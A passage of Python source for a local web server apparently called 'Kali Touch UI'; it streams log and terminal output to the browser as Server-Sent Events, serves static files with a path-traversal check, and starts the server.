                for ln in lines:
                    for chunk in ln.splitlines(keepends=True):
                        self.wfile.write(f"data: {chunk}\n\n".encode())
                self.wfile.flush()
                time.sleep(0.2)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def handle_sse_term(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        try:
            while True:
                out = TERM.poll()
                for chunk in out:
                    if isinstance(chunk, bytes):
                        text = chunk.decode("utf-8", "replace")
                    else:
                        text = str(chunk)
                    # JSON-encode so \n / control bytes survive the SSE wire.
                    self.wfile.write(f"data: {json.dumps(text)}\n\n".encode())
                self.wfile.flush()
                time.sleep(0.15)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def serve_file(self, rel, ctype):
        target = os.path.realpath(os.path.join(ROOT, rel))
        if not target.startswith(ROOT):
            self._send(403, b"forbidden")
            return
        if os.path.isfile(target):
            with open(target, "rb") as f:
                self._send(200, f.read(), ctype)
        else:
            self._send(404, b"nf")


if __name__ == "__main__":
    ensure_users_file()
    print(f"Kali Touch UI listening on http://{HOST}:{PORT}")
    print(f"default wordlist: {default_wordlist()}")
    srv = ThreadingHTTPServer((HOST, PORT), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
